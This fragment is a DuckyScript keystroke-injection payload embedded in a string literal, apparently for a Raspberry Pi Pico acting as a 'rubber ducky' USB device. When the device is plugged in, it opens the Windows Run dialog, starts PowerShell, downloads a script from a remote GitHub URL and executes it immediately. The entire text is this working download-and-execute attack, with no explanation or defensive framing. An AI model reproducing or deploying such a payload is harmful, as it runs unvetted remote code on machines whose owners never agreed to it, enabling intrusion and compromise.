"GUI r\n\
STRINGLN powershell\n\
STRINGLN $script = [scriptblock]::Create((New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/marwinkloefer/DuckyPiPico/main/downloadopen.ps1\'));\n\
STRINGLN Invoke-Command -ScriptBlock $script";